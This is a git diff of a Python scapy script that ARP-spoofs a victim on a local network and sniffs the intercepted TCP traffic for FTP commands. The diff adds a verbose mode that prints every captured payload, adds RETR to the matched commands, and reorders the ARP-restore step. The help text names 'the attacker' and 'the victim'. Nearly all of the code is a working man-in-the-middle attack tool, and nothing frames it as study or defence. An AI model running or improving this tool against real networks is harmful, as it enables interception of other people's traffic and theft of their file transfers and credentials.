@@ -4,7 +4,6 @@ import argparse
 from threading import Thread
 from scapy.all import ARP, send, sniff, TCP, Raw, get_if_addr
 
-
 def arp_spoof(target_ip, spoof_ip, target_mac):
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     send(packet, verbose=False)
@@ -20,10 +19,10 @@ def sniff_ftp_packets():
     def process_packet(pkt):
         if pkt.haslayer(TCP) and pkt.haslayer(Raw):
             payload = pkt[Raw].load.decode(errors='ignore')
-            if 'STOR' in payload or 'PUT' in payload:
-                print(f"[FTP] File upload command detected: {payload.strip()}")
-            elif pkt[TCP].dport >= 1024:  # Possible FTP data port
-                print(f"[FTP] Possible data transfer: {len(payload)} bytes")
+            if verbose == True:
+                print(f"[FTP] Event detected: {payload.strip()}")
+            elif 'STOR' in payload or 'PUT' in payload or 'RETR' in payload:
+                print(f"[FTP] Exchange file: {payload.strip()}")
 
     sniff(filter="tcp", prn=process_packet, iface="eth0", store=0)
 
@@ -38,7 +37,11 @@ def main():
     parser.add_argument("MACsrc", type=str, help="the attacker's MAC (your MAC address)")
     parser.add_argument("IPtarget", type=str, help="the victim's IP address")
     parser.add_argument("MACtarget", type=str, help="the victim's MAC")
+    parser.add_argument("-v", action="store_true", help="Sniff all event")
     args = parser.parse_args()
+    global verbose
+    verbose = args.v
+    print(f"Verbose = {verbose}")
     try:
         spoof_thread = Thread(target=lambda: loop_spoof(args))
         spoof_thread.daemon = True
@@ -47,8 +50,8 @@ def main():
         # Start sniffing packets
         sniff_ftp_packets()
     except KeyboardInterrupt:
-        restore_arp(args.IPtarget, args.MACtarget, args.MACsrc)
         print("[C^] Attack closed")
+        restore_arp(args.IPtarget, args.MACtarget, args.MACsrc)
 
 if __name__ == "__main__":
     sys.exit(main())
